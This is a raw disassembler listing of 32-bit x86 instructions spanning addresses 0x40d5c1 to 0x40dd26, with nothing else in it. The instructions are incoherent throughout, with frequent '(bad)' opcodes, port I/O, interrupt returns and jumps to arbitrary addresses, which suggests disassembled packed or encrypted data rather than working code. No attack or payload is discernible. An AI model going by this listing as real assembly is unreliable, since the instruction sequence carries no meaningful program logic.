  40d5c1:	fist   DWORD PTR [eax+edx*8-0x6c5768bb]
  40d5c8:	out    0xd6,al
  40d5ca:	mov    BYTE PTR [ebx+0x16d43e0a],dl
  40d5d0:	push   cs
  40d5d1:	xlat   BYTE PTR ds:[ebx]
  40d5d2:	xchg   edi,eax
  40d5d3:	scas   al,BYTE PTR es:[edi]
  40d5d4:	sub    BYTE PTR [edx],dh
  40d5d6:	test   al,0xb1
  40d5d8:	mov    bl,al
  40d5da:	cmp    ebx,DWORD PTR [edx+0x1a]
  40d5dd:	cmp    al,0xe2
  40d5df:	je     0x40d5a1
  40d5e1:	aaa    
  40d5e2:	and    edx,DWORD PTR [ecx-0x69]
  40d5e5:	pushf  
  40d5e6:	aad    0x90
  40d5e8:	iret   
  40d5e9:	dec    eax
  40d5ea:	imul   edx,DWORD PTR [ecx-0x40],0xbce61f95
  40d5f1:	inc    esp
  40d5f2:	test   ah,bh
  40d5f4:	shr    BYTE PTR [edx],1
  40d5f6:	sbb    ebx,eax
  40d5f8:	jmp    0xb7dbccd0
  40d5fd:	retf   0x4fec
  40d600:	push   ecx
  40d601:	and    al,0xa7
  40d603:	mov    esi,0x5decf4c5
  40d608:	jo     0x40d5d3
  40d60a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40d60c:	outs   dx,BYTE PTR ds:[esi]
  40d60d:	fsub   st(2),st
  40d60f:	mov    eax,ds:0xa14de7fc
  40d614:	xchg   esp,eax
  40d615:	stc    
  40d616:	mov    dh,0x35
  40d618:	nop
  40d619:	push   edx
  40d61a:	outs   dx,BYTE PTR ds:[esi]
  40d61b:	mov    ebx,0xe29abeca
  40d620:	icebp  
  40d621:	fldenv [edi+0x7928ad16]
  40d627:	out    0x48,eax
  40d629:	dec    edx
  40d62a:	and    eax,0xc2093d0b
  40d62f:	adc    al,0x6c
  40d631:	xor    DWORD PTR [edi],ecx
  40d633:	xchg   edi,eax
  40d634:	rol    DWORD PTR [eax],1
  40d636:	sub    DWORD PTR [edi*2-0xca6aedb],0x19275587
  40d641:	mov    esp,0x5cff0047
  40d646:	sti    
  40d647:	nop
  40d648:	sbb    al,BYTE PTR [eax]
  40d64a:	push   0x2ce46079
  40d64f:	clc    
  40d650:	fld    QWORD PTR [edi]
  40d652:	mov    dl,0x6d
  40d654:	bound  edi,QWORD PTR [edi+0x75eee318]
  40d65a:	cs loop 0x40d6b2
  40d65d:	xchg   edi,eax
  40d65e:	push   cs
  40d65f:	imul   edi,ebx,0x6ed3d513
  40d665:	popf   
  40d666:	mov    ch,0xff
  40d668:	js     0x40d611
  40d66a:	jbe    0x40d667
  40d66c:	sub    DWORD PTR [ecx-0x6b],edi
  40d66f:	adc    BYTE PTR [ebx+0x20],bl
  40d672:	retf   0x4786
  40d675:	fisubr WORD PTR [ebx+0x59]
  40d678:	daa    
  40d679:	dec    eax
  40d67a:	sub    edx,eax
  40d67c:	jb     0x40d694
  40d67e:	and    BYTE PTR [edx+eax*1+0x10],al
  40d682:	test   dh,0x76
  40d685:	push   ebp
  40d686:	add    DWORD PTR [eax-0x6a34b3e0],esi
  40d68c:	out    0x68,eax
  40d68e:	adc    eax,0xbf47bac1
  40d693:	ja     0x40d628
  40d695:	(bad)
  40d699:	mov    bh,0x4d
  40d69b:	in     eax,0x6
  40d69d:	pop    ebp
  40d69e:	xchg   edi,eax
  40d69f:	imul   edx,DWORD PTR [ebx-0x65],0xbe7538dd
  40d6a6:	clc    
  40d6a7:	pop    edx
  40d6a8:	xchg   ah,bl
  40d6aa:	cmp    BYTE PTR [edx+0x59],0x56
  40d6ae:	pop    ecx
  40d6af:	or     al,0xf6
  40d6b1:	retf   0x4eb4
  40d6b4:	test   eax,0x9893b41c
  40d6b9:	jns    0x40d67e
  40d6bb:	ins    BYTE PTR es:[edi],dx
  40d6bc:	adc    DWORD PTR [esi+ecx*8+0x1f512e3e],esp
  40d6c3:	fisubr DWORD PTR [edi-0x71]
  40d6c6:	iret   
  40d6c7:	cs jbe 0x40d6a1
  40d6ca:	cmp    ah,bh
  40d6cc:	mov    ecx,0xc211f9e
  40d6d1:	data16 jp 0x40d695
  40d6d4:	(bad)  
  40d6d5:	ins    BYTE PTR es:[edi],dx
  40d6d6:	mov    al,ds:0x73429692
  40d6db:	dec    ecx
  40d6dc:	fldcw  WORD PTR [esi-0x1c]
  40d6df:	cdq    
  40d6e0:	cmc    
  40d6e1:	dec    ebp
  40d6e2:	jecxz  0x40d707
  40d6e4:	fmul   DWORD PTR [ebx-0x3daa5a13]
  40d6ea:	test   edx,ecx
  40d6ec:	inc    esp
  40d6ed:	pop    es
  40d6ee:	mov    dl,0x85
  40d6f0:	dec    esp
  40d6f1:	out    dx,eax
  40d6f2:	aad    0x30
  40d6f4:	lock das 
  40d6f6:	jl     0x40d6a7
  40d6f8:	sub    eax,0x9228edbc
  40d6fd:	aaa    
  40d6fe:	and    ecx,DWORD PTR ds:0x3daab9a6
  40d704:	rcr    DWORD PTR [ebx-0xf],cl
  40d707:	popa   
  40d708:	inc    ebp
  40d709:	jnp    0x40d6d3
  40d70b:	popf   
  40d70c:	(bad)  
  40d70d:	and    DWORD PTR [ebx+0x2d8bc8a4],0xffffffbd
  40d714:	jg     0x40d6ca
  40d716:	out    0x3c,eax
  40d718:	mov    al,0xed
  40d71a:	(bad)  
  40d71c:	stos   DWORD PTR es:[edi],eax
  40d71d:	sbb    esp,DWORD PTR [ebp+ebx*8-0x5187319d]
  40d724:	jmp    0xfc34f0a3
  40d729:	pop    es
  40d72a:	jns    0x40d77a
  40d72c:	loope  0x40d754
  40d72e:	push   ebx
  40d72f:	(bad)  
  40d730:	xchg   BYTE PTR [edi],dl
  40d732:	fisub  WORD PTR [edx-0x48435e6]
  40d738:	out    0x5d,al
  40d73a:	cmp    DWORD PTR [ecx+0x31fc9123],ebp
  40d740:	fsub   DWORD PTR [edx+0x42f2b2bc]
  40d746:	pop    es
  40d747:	jb     0x40d7a0
  40d749:	jge    0x40d7ab
  40d74b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d74c:	test   al,0xba
  40d74e:	out    0x7e,eax
  40d750:	inc    esi
  40d751:	mov    ecx,0x888491d1
  40d756:	lods   al,BYTE PTR ds:[esi]
  40d757:	inc    edi
  40d758:	sub    BYTE PTR [edi+0x51d67557],al
  40d75e:	sar    DWORD PTR [edi+0xf],0x85
  40d762:	inc    edx
  40d763:	mov    eax,ds:0xe0af8b5
  40d768:	stos   BYTE PTR es:[edi],al
  40d769:	xchg   ebp,eax
  40d76a:	(bad)  
  40d76b:	fmulp  st(5),st
  40d76d:	pop    esp
  40d76e:	mov    ds:0x63801fc2,eax
  40d773:	xor    al,0xfb
  40d775:	adc    ebp,DWORD PTR [ebp+0xfca51e9]
  40d77b:	push   es
  40d77c:	push   esi
  40d77d:	jmp    0x40d7ae
  40d77f:	or     BYTE PTR ds:0xe6498dde,bh
  40d785:	fs xchg esp,eax
  40d787:	mov    ebx,ecx
  40d789:	stc    
  40d78a:	pop    ebx
  40d78b:	mov    eax,ds:0x697a1a6b
  40d790:	and    al,0x60
  40d792:	cmc    
  40d793:	or     esi,ebp
  40d795:	ins    DWORD PTR es:[edi],dx
  40d796:	idiv   edx
  40d798:	jno    0x40d73e
  40d79a:	sub    eax,0xe09ac44
  40d79f:	inc    ebx
  40d7a0:	pop    ebp
  40d7a1:	cmp    eax,DWORD PTR ds:0xbf217f63
  40d7a7:	(bad)  
  40d7a8:	imul   esp,DWORD PTR [esi-0x180d76a4],0x9130a35d
  40d7b2:	mov    esi,0x57246213
  40d7b7:	pop    ebx
  40d7b8:	sar    DWORD PTR [edi],1
  40d7ba:	mov    edx,0xaa2b291d
  40d7bf:	stos   BYTE PTR es:[edi],al
  40d7c0:	jno    0x40d802
  40d7c2:	adc    DWORD PTR [ebp-0x75],0xffffff98
  40d7c6:	jb     0x40d820
  40d7c8:	cmc    
  40d7c9:	lea    esp,[ecx+0x4f]
  40d7cc:	mov    ebp,0x9506b7bc
  40d7d1:	or     eax,0x5dc6b7b9
  40d7d6:	inc    edi
  40d7d7:	pop    es
  40d7d8:	or     cl,cl
  40d7da:	popa   
  40d7db:	retf   0x73b9
  40d7de:	mov    bh,0x2c
  40d7e0:	ret    0x3875
  40d7e3:	mov    eax,ds:0x11e37d29
  40d7e8:	(bad)  
  40d7e9:	ss push edx
  40d7eb:	xchg   ebp,eax
  40d7ec:	or     DWORD PTR [ebx+0x4b5629a2],esi
  40d7f2:	lods   eax,DWORD PTR ds:[esi]
  40d7f3:	ins    BYTE PTR es:[edi],dx
  40d7f4:	jg     0x40d7d3
  40d7f6:	out    dx,al
  40d7f7:	dec    esp
  40d7f8:	add    dh,BYTE PTR ds:0x3b6ce2ca
  40d7fe:	leave  
  40d7ff:	pop    ss
  40d800:	imul   ebp,ecx,0xd2ec63af
  40d806:	jo     0x40d883
  40d808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d809:	jmp    0x40d7cf
  40d80b:	sar    DWORD PTR [esi+eax*4+0x6e],cl
  40d80f:	mov    ds:0x12ea696b,eax
  40d814:	gs cwde 
  40d816:	in     eax,0xbe
  40d818:	lds    esp,FWORD PTR [edi]
  40d81a:	scas   al,BYTE PTR es:[edi]
  40d81b:	sbb    BYTE PTR [ebx+edx*4],bl
  40d81e:	push   esp
  40d81f:	jp     0x40d8a0
  40d821:	scas   al,BYTE PTR es:[edi]
  40d822:	fidivr WORD PTR [ebx]
  40d824:	mov    eax,0xbd255cb1
  40d829:	lods   al,BYTE PTR ds:[esi]
  40d82a:	loop   0x40d8a5
  40d82c:	cwde   
  40d82d:	fcom   QWORD PTR [edx-0x42a04fc7]
  40d833:	out    dx,eax
  40d834:	push   ebp
  40d835:	scas   al,BYTE PTR es:[edi]
  40d836:	or     cl,BYTE PTR [eax+0x5c]
  40d839:	inc    edi
  40d83a:	std    
  40d83b:	and    ch,BYTE PTR [esi-0xc1fff6e]
  40d841:	adc    al,0xfc
  40d843:	ss ins BYTE PTR es:[edi],dx
  40d845:	mov    ?,WORD PTR [edx]
  40d847:	int3   
  40d848:	mov    ebx,0xf2ae45e5
  40d84d:	sbb    eax,0x570d7171
  40d852:	jne    0x40d805
  40d854:	les    esi,FWORD PTR [esi+esi*2]
  40d857:	imul   ecx,DWORD PTR [ebp+0x2574c8bc],0xe68b9a5a
  40d861:	repz (bad) 
  40d863:	int    0x23
  40d865:	test   DWORD PTR [edx],ecx
  40d867:	fcom   DWORD PTR [edi+0x5e]
  40d86a:	inc    ebx
  40d86b:	mov    ebp,0x1b2cb8c1
  40d870:	or     BYTE PTR [eax-0x72],cl
  40d873:	jmp    0x40d805
  40d875:	imul   eax,DWORD PTR [ebp-0x1b8c4f0d],0x1c
  40d87c:	adc    al,0x82
  40d87e:	add    eax,0x56c299df
  40d883:	sub    ah,bh
  40d885:	icebp  
  40d886:	mov    esi,DWORD PTR [ebx+0x60]
  40d889:	sub    DWORD PTR [ebx-0x32],edi
  40d88c:	mov    bl,0x77
  40d88e:	fisub  DWORD PTR [ebx]
  40d890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d892:	xchg   esi,eax
  40d893:	pop    ebp
  40d894:	pusha  
  40d895:	int3   
  40d896:	push   0xa28f0708
  40d89b:	jle    0x40d8ef
  40d89d:	repz dec ebx
  40d89f:	js     0x40d82a
  40d8a1:	pop    edx
  40d8a2:	mov    ds,esi
  40d8a4:	jne    0x40d89d
  40d8a6:	fwait
  40d8a7:	scas   eax,DWORD PTR es:[edi]
  40d8a8:	jo     0x40d8e2
  40d8aa:	pop    esi
  40d8ab:	out    0x33,al
  40d8ad:	aad    0x35
  40d8af:	jbe    0x40d89a
  40d8b1:	and    DWORD PTR [edx],edi
  40d8b3:	jno    0x40d8e1
  40d8b5:	push   ebx
  40d8b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8b7:	cs jmp 0x3acb:0x109b9db2
  40d8bf:	xchg   ebx,eax
  40d8c0:	or     eax,0xeef60f73
  40d8c5:	cmp    esp,esp
  40d8c7:	std    
  40d8c8:	cmp    eax,0x44db04c5
  40d8cd:	mov    edx,0x31bd0cd8
  40d8d2:	ins    DWORD PTR es:[edi],dx
  40d8d3:	leave  
  40d8d4:	push   edx
  40d8d5:	sub    DWORD PTR [esi-0x4e],edi
  40d8d8:	fs repnz pop ds
  40d8db:	adc    al,0xa9
  40d8dd:	jge    0x40d91f
  40d8df:	mov    edx,0x8dec0193
  40d8e4:	push   0x880c6b23
  40d8e9:	xor    al,al
  40d8eb:	mov    ch,0xeb
  40d8ed:	mov    ecx,0xbd264526
  40d8f2:	outs   dx,BYTE PTR ds:[esi]
  40d8f3:	repz cmp al,0x41
  40d8f6:	jecxz  0x40d8c0
  40d8f8:	icebp  
  40d8f9:	inc    esp
  40d8fa:	(bad)  
  40d8fb:	out    dx,al
  40d8fc:	jnp    0x40d967
  40d8fe:	add    eax,0x27440dde
  40d903:	inc    ebp
  40d904:	ret    
  40d905:	pushf  
  40d906:	mov    BYTE PTR [esi-0x72],bh
  40d909:	sbb    ch,BYTE PTR ds:0x6d1563c
  40d90f:	pop    eax
  40d910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d911:	sub    bh,BYTE PTR [ebx+0x45]
  40d914:	(bad)  
  40d915:	int    0xcf
  40d917:	retf   
  40d918:	push   0x3b0f28cc
  40d91d:	dec    ecx
  40d91e:	jmp    FWORD PTR [ebp-0x1c]
  40d921:	sbb    eax,0x867c0ac6
  40d926:	and    eax,0x6cb4fb42
  40d92b:	lock fst st(0)
  40d92e:	shr    edx,cl
  40d930:	sub    DWORD PTR [edi+0x4e],edx
  40d933:	(bad)  
  40d934:	push   ebp
  40d935:	fimul  DWORD PTR [edi+eax*2-0x61d54a7f]
  40d93c:	fcmovne st,st(2)
  40d93e:	cmp    DWORD PTR [edi],esp
  40d940:	dec    eax
  40d941:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40d943:	sbb    ebx,DWORD PTR [esi]
  40d945:	adc    eax,0xe57b5668
  40d94a:	inc    eax
  40d94b:	pop    ebx
  40d94c:	pop    esi
  40d94d:	dec    edi
  40d94e:	test   eax,0x2cc4f0fa
  40d953:	xchg   ebx,eax
  40d954:	mov    ss,WORD PTR ds:0x9a1043dd
  40d95a:	imul   edx,DWORD PTR [edx-0x61],0x6dc09b2b
  40d961:	mov    cs,WORD PTR [eax-0x4508a2ae]
  40d967:	inc    esi
  40d968:	loopne 0x40d910
  40d96a:	das    
  40d96b:	jo     0x40d91a
  40d96d:	lods   al,BYTE PTR ds:[esi]
  40d96e:	ins    DWORD PTR es:[edi],dx
  40d96f:	cmp    BYTE PTR [ebx+0x41],ch
  40d972:	sbb    esi,DWORD PTR [ebp+0x3b9d97e1]
  40d978:	sahf   
  40d979:	jns    0x40d9ed
  40d97b:	pop    ebp
  40d97c:	jnp    0x40d927
  40d97e:	aaa    
  40d97f:	pop    esi
  40d980:	je     0x40d904
  40d982:	and    BYTE PTR [eax-0x73],0x4b
  40d986:	xchg   ecx,eax
  40d987:	sub    DWORD PTR [edx+0x79f72a4e],0x40
  40d98e:	out    dx,al
  40d98f:	mov    ebp,0x1399c3c8
  40d994:	pop    esp
  40d995:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d996:	out    dx,eax
  40d997:	test   BYTE PTR [ebx],al
  40d999:	scas   al,BYTE PTR es:[edi]
  40d99a:	pop    ss
  40d99b:	loop   0x40d95d
  40d99d:	cs fdiv st,st(6)
  40d9a0:	sti    
  40d9a1:	ret    0x2077
  40d9a4:	or     eax,0xd3448941
  40d9a9:	xchg   DWORD PTR [edx+edx*2+0x13b12b49],ecx
  40d9b0:	sbb    DWORD PTR [ecx-0x47],esi
  40d9b3:	xor    DWORD PTR [edi],0xd8705e5e
  40d9b9:	mov    edi,0xaad9f42e
  40d9be:	cld    
  40d9bf:	scas   al,BYTE PTR es:[edi]
  40d9c0:	or     dl,0x1c
  40d9c3:	xchg   DWORD PTR [ebx],edi
  40d9c5:	cmp    BYTE PTR [eax-0x6107d153],ch
  40d9cb:	retf   0xee1a
  40d9ce:	push   DWORD PTR [esi+ecx*4]
  40d9d1:	add    BYTE PTR [ebx],dl
  40d9d3:	mov    ecx,0x74bd0070
  40d9d8:	mov    ch,BYTE PTR [esp+edi*1]
  40d9db:	xor    BYTE PTR [eax],bh
  40d9dd:	mov    fs,WORD PTR [ecx+edx*1]
  40d9e0:	mov    dl,0xe1
  40d9e2:	and    BYTE PTR [ebx-0x5fcc6cc5],0xc1
  40d9e9:	jns    0x40d975
  40d9eb:	xor    DWORD PTR [ebp-0x78],esi
  40d9ee:	ja     0x40d9c7
  40d9f0:	mov    ds:0xa58f7669,al
  40d9f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9f6:	fwait
  40d9f7:	paddusw mm1,QWORD PTR [eax]
  40d9fa:	out    0x4e,eax
  40d9fc:	add    BYTE PTR [edx+ebx*1+0x61270f47],ah
  40da03:	cmp    eax,0x63ba81ac
  40da08:	dec    edx
  40da09:	or     edi,esi
  40da0b:	ins    DWORD PTR es:[edi],dx
  40da0c:	inc    edi
  40da0d:	ins    BYTE PTR es:[edi],dx
  40da0e:	inc    ebp
  40da0f:	mov    al,0x14
  40da11:	adc    eax,0xc08edb40
  40da16:	mov    ebp,0xcbbc9154
  40da1b:	outs   dx,DWORD PTR ds:[esi]
  40da1c:	pop    esp
  40da1d:	gs dec esp
  40da1f:	sar    eax,1
  40da21:	xor    al,BYTE PTR [edx-0x51fdc179]
  40da27:	iret   
  40da28:	inc    ecx
  40da29:	xor    ebp,DWORD PTR [edx+eiz*4]
  40da2c:	call   0x4107b23e
  40da31:	hlt    
  40da32:	mov    esp,0x26378727
  40da37:	outs   dx,BYTE PTR ds:[esi]
  40da38:	adc    ebx,DWORD PTR [ecx]
  40da3a:	jg     0x40da6b
  40da3c:	xor    bh,BYTE PTR [ebx]
  40da3e:	and    DWORD PTR [esi],ebx
  40da40:	stc    
  40da41:	cmp    eax,0xb2e32389
  40da46:	push   ebx
  40da47:	loopne 0x40dac0
  40da49:	jns    0x40dac3
  40da4b:	out    0x7d,eax
  40da4d:	fistp  WORD PTR [edx+0x6649c1b]
  40da53:	ins    DWORD PTR es:[edi],dx
  40da54:	jl     0x40da64
  40da56:	xchg   edi,eax
  40da57:	or     BYTE PTR [edi-0x63a8b113],bl
  40da5d:	(bad)  
  40da5f:	pop    esi
  40da60:	sub    al,0xb0
  40da62:	or     al,0x18
  40da64:	fiadd  DWORD PTR [esi-0xb4dfe5d]
  40da6a:	xor    BYTE PTR [ebx],bl
  40da6c:	(bad)  
  40da6d:	enter  0x47a2,0x3f
  40da71:	push   ecx
  40da72:	inc    ecx
  40da73:	fs jno 0x40da29
  40da76:	(bad)  
  40da77:	test   eax,0x33d160a1
  40da7c:	mov    al,0x35
  40da7e:	jo     0x40dae7
  40da80:	pop    eax
  40da81:	addr16 (bad) 
  40da84:	mov    ah,0xb3
  40da86:	pop    ss
  40da87:	popf   
  40da88:	jns    0x40da4a
  40da8a:	data16 fsubp st(4),st
  40da8d:	out    0x4a,al
  40da8f:	pop    ebx
  40da90:	adc    al,0x26
  40da92:	ss test eax,0x183412db
  40da98:	jp     0x40da69
  40da9a:	push   0x18
  40da9c:	jno    0x40da46
  40da9e:	out    0x48,al
  40daa0:	xchg   edx,eax
  40daa1:	dec    ebx
  40daa2:	mov    DWORD PTR [ecx-0x5c],ebp
  40daa5:	int    0x2f
  40daa7:	jge    0x40db16
  40daa9:	or     DWORD PTR [ebx-0x3acdd586],esi
  40daaf:	dec    ebp
  40dab0:	call   0x98067b37
  40dab5:	sub    DWORD PTR [edi-0x6aa810f6],ebp
  40dabb:	in     eax,0x36
  40dabd:	test   al,0xe0
  40dabf:	bound  edi,QWORD PTR [ebp+0x7a345f4b]
  40dac5:	cmc    
  40dac6:	inc    esp
  40dac7:	adc    al,0xfb
  40dac9:	add    BYTE PTR [ecx+0x7e498f95],bl
  40dacf:	adc    al,BYTE PTR [edx+0x74]
  40dad2:	das    
  40dad3:	stos   BYTE PTR es:[edi],al
  40dad4:	jb     0x40dab8
  40dad6:	scas   al,BYTE PTR es:[edi]
  40dad7:	stos   BYTE PTR es:[edi],al
  40dad8:	or     eax,0x21edd1ca
  40dadd:	sti    
  40dade:	loop   0x40dad6
  40dae0:	fwait
  40dae1:	sub    DWORD PTR [edx],edx
  40dae3:	sbb    BYTE PTR [edi+0x7977442e],dl
  40dae9:	dec    ecx
  40daea:	in     al,dx
  40daeb:	inc    esp
  40daec:	aas    
  40daed:	(bad)  
  40daee:	ss cli 
  40daf0:	push   DWORD PTR [ecx]
  40daf2:	pop    ebx
  40daf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daf4:	dec    esp
  40daf5:	fwait
  40daf6:	cdq    
  40daf7:	mov    eax,0xf41ea4dc
  40dafc:	ret    0x1440
  40daff:	mov    eax,0x28084012
  40db04:	sti    
  40db05:	inc    BYTE PTR [ecx-0x3737d12a]
  40db0b:	(bad)  
  40db0c:	test   al,0x80
  40db0e:	sub    ecx,edi
  40db10:	mov    edi,0x9d7e6f46
  40db15:	loop   0x40dae0
  40db17:	mov    DWORD PTR [edi-0x56],esi
  40db1a:	inc    edx
  40db1b:	xchg   ebx,eax
  40db1c:	ins    DWORD PTR es:[edi],dx
  40db1d:	lds    ebx,FWORD PTR [ecx]
  40db1f:	mov    esp,0x4f625c00
  40db24:	pop    esi
  40db25:	f2xm1  
  40db27:	or     eax,0xfa1026f5
  40db2c:	out    dx,eax
  40db2d:	frndint 
  40db2f:	xlat   BYTE PTR ds:[ebx]
  40db30:	mov    DWORD PTR [ebx],0x6220cbe6
  40db36:	imul   esp,ebp,0x9a9b2270
  40db3c:	mov    BYTE PTR [eax-0x3964306b],cl
  40db42:	pop    ds
  40db43:	mov    ebp,0xa7f3e33c
  40db48:	js     0x40db98
  40db4a:	push   eax
  40db4b:	jle    0x40db43
  40db4d:	adc    DWORD PTR [eax],edx
  40db4f:	xor    al,0x2e
  40db51:	out    0x77,eax
  40db53:	jno    0x40db06
  40db55:	aad    0xed
  40db57:	sub    eax,0x1f2f42dc
  40db5d:	xchg   eax,ebx
  40db5f:	cwde   
  40db60:	push   eax
  40db61:	lea    esp,[edx-0x7e]
  40db64:	mov    ecx,DWORD PTR [edi+0x23dce2fb]
  40db6a:	jge    0x40db30
  40db6c:	add    eax,0x17453b6
  40db71:	in     eax,0x2
  40db73:	div    BYTE PTR [ebx]
  40db75:	mov    ch,0xd6
  40db77:	xor    al,0x36
  40db79:	fist   WORD PTR [edx-0x58]
  40db7c:	jp     0x40db95
  40db7e:	cmp    al,0xca
  40db80:	pop    ss
  40db81:	mov    bh,0x7c
  40db83:	jmp    0x5274:0xea58723e
  40db8a:	gs xchg ah,dh
  40db8d:	idiv   DWORD PTR [esi]
  40db8f:	xchg   esp,eax
  40db90:	cld    
  40db91:	les    eax,FWORD PTR [ebp+esi*1+0x2481ba60]
  40db98:	sbb    eax,ebx
  40db9a:	sub    cl,ch
  40db9c:	jle    0x40db71
  40db9e:	pop    esp
  40db9f:	fwait
  40dba0:	std    
  40dba1:	mov    ds:0xb7fca379,al
  40dba6:	push   ss
  40dba7:	pop    edx
  40dba8:	pop    ecx
  40dba9:	out    dx,eax
  40dbaa:	xchg   edx,eax
  40dbab:	inc    edi
  40dbac:	(bad)
  40dbb0:	and    eax,DWORD PTR [ebx-0x5611ecb2]
  40dbb6:	sbb    ch,cl
  40dbb8:	lock xor eax,0x32ce2aa4
  40dbbe:	fisubr WORD PTR [eax+0x1f]
  40dbc1:	sub    dh,al
  40dbc3:	inc    eax
  40dbc4:	fwait
  40dbc5:	dec    ebp
  40dbc6:	sbb    esi,DWORD PTR [ebx+0x3bb08f46]
  40dbcc:	ja     0x40db90
  40dbce:	mov    edx,0xbb48d488
  40dbd3:	lods   al,BYTE PTR ds:[esi]
  40dbd4:	jecxz  0x40db97
  40dbd6:	retf   
  40dbd7:	test   BYTE PTR [edx],0x8a
  40dbda:	mov    esi,0xc7d08136
  40dbdf:	pop    edi
  40dbe0:	cli    
  40dbe1:	xchg   esi,eax
  40dbe2:	popa   
  40dbe3:	jl     0x40dbd0
  40dbe5:	adc    ebp,DWORD PTR [ecx]
  40dbe7:	retf   
  40dbe8:	cld    
  40dbe9:	mov    ebp,0xb79ff7bf
  40dbee:	xchg   esi,eax
  40dbef:	data16 (bad) 
  40dbf1:	jnp    0x40db9a
  40dbf3:	enter  0xbc37,0x8a
  40dbf7:	push   edx
  40dbf8:	(bad)  
  40dbf9:	jae    0x40db7b
  40dbfb:	loopne 0x40dc37
  40dbfd:	ins    DWORD PTR es:[edi],dx
  40dbfe:	mov    WORD PTR [eax-0x57],es
  40dc01:	out    0xab,al
  40dc03:	sbb    bh,BYTE PTR [edi-0x78269b5]
  40dc09:	xchg   DWORD PTR [edi+0x2],edx
  40dc0c:	aad    0x36
  40dc0e:	mov    ah,0xe4
  40dc10:	mov    WORD PTR [edi],gs
  40dc12:	int3   
  40dc13:	push   0xc9d91dcb
  40dc18:	and    ch,BYTE PTR [ebp-0x13a231f]
  40dc1e:	push   DWORD PTR [esi-0x3c489fd1]
  40dc24:	sti    
  40dc25:	fst    DWORD PTR [edx+0x1]
  40dc28:	rol    ebx,0xa0
  40dc2b:	mov    eax,ds:0xe78640ef
  40dc30:	addr16 push ss
  40dc32:	sbb    esp,DWORD PTR [eax]
  40dc34:	mov    BYTE PTR [ebp-0x55],dh
  40dc37:	jbe    0x40dc60
  40dc39:	stos   DWORD PTR es:[edi],eax
  40dc3a:	rcr    BYTE PTR [ecx+0x161e642a],1
  40dc40:	push   ebx
  40dc41:	cmp    eax,0xe2ba5a80
  40dc46:	sub    DWORD PTR [edx],ecx
  40dc48:	jno    0x40dca8
  40dc4a:	jo     0x40dbd8
  40dc4c:	fs in  al,dx
  40dc4e:	mov    BYTE PTR [ecx+eax*2+0xa],bh
  40dc52:	xchg   ebx,eax
  40dc53:	pop    ebp
  40dc54:	inc    ecx
  40dc55:	test   eax,0x87d68fe7
  40dc5a:	jp     0x40dcda
  40dc5c:	dec    ebx
  40dc5d:	imul   esp,DWORD PTR [esi+edi*2],0xffffffe0
  40dc61:	sub    edx,DWORD PTR [ecx-0x5]
  40dc64:	shl    edx,0x69
  40dc67:	inc    edx
  40dc68:	outs   dx,DWORD PTR ds:[esi]
  40dc69:	packsswb mm7,QWORD PTR [edx]
  40dc6c:	sahf   
  40dc6d:	pushf  
  40dc6e:	ins    BYTE PTR es:[edi],dx
  40dc6f:	imul   ecx,DWORD PTR [ecx+0x1f3759ea],0xffffffa4
  40dc76:	outs   dx,BYTE PTR ds:[esi]
  40dc77:	mov    ebp,0xa65b80b
  40dc7c:	mov    eax,0xa9ce1567
  40dc81:	and    ebp,DWORD PTR [eiz*2-0x447a54b5]
  40dc88:	push   cs
  40dc89:	sub    eax,0x4d265f7a
  40dc8e:	shr    DWORD PTR [ecx+0x5b7e0304],0x1e
  40dc95:	adc    al,0x57
  40dc97:	outs   dx,BYTE PTR ss:[esi]
  40dc99:	test   eax,0x9f6e796e
  40dc9e:	out    dx,eax
  40dc9f:	dec    eax
  40dca0:	lods   eax,DWORD PTR ds:[esi]
  40dca1:	push   ds
  40dca2:	test   BYTE PTR [edi],ah
  40dca4:	and    DWORD PTR [ebx],ecx
  40dca6:	add    dl,BYTE PTR [ebx]
  40dca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dca9:	pop    esi
  40dcaa:	jnp    0x40dc6a
  40dcac:	addr16 out 0xdc,al
  40dcaf:	cmp    al,0x41
  40dcb1:	ins    BYTE PTR es:[edi],dx
  40dcb2:	shr    BYTE PTR [ecx],1
  40dcb4:	mov    ch,0xdc
  40dcb6:	arpl   WORD PTR [edx-0x7a],cx
  40dcb9:	mov    ds:0xc64dc3a6,eax
  40dcbe:	add    al,0xda
  40dcc0:	inc    DWORD PTR [esi+0x75]
  40dcc3:	lock xchg DWORD PTR [ebx],eax
  40dcc6:	mov    ebp,ebp
  40dcc8:	test   BYTE PTR [ecx-0x7],bh
  40dccb:	test   eax,0xc9c0ac99
  40dcd0:	mov    bl,0x3b
  40dcd2:	fyl2x  
  40dcd4:	pop    ecx
  40dcd5:	add    DWORD PTR [edx-0x5e615338],edx
  40dcdb:	fs push 0xffffffc3
  40dcde:	mov    al,0xd1
  40dce0:	imul   ebp,DWORD PTR [ebx+0x5ac17a0b],0x59
  40dce7:	(bad)  
  40dce8:	pop    eax
  40dce9:	cmp    dh,BYTE PTR [ecx]
  40dceb:	dec    ebp
  40dcec:	sub    al,BYTE PTR [ebx-0x2ba14cdb]
  40dcf2:	not    DWORD PTR [esi-0x2d810870]
  40dcf8:	repnz dec esi
  40dcfa:	xor    al,0x12
  40dcfc:	sub    dl,BYTE PTR [eax+0x579154ce]
  40dd02:	adc    ebx,ecx
  40dd04:	out    0x89,al
  40dd06:	aam    0xcb
  40dd08:	into   
  40dd09:	test   al,0x47
  40dd0b:	or     dl,BYTE PTR [ebp+0x341e796d]
  40dd11:	outs   dx,BYTE PTR ds:[esi]
  40dd12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd13:	jnp    0x40dd04
  40dd15:	lods   al,BYTE PTR ds:[esi]
  40dd16:	int3   
  40dd17:	or     BYTE PTR [ebp+ebp*8+0x6ca2afe4],0x3e
  40dd1f:	pop    edx
  40dd20:	ds jnp 0x40dd05
  40dd23:	retf   0x587f
  40dd26:	jns    0x40dd37
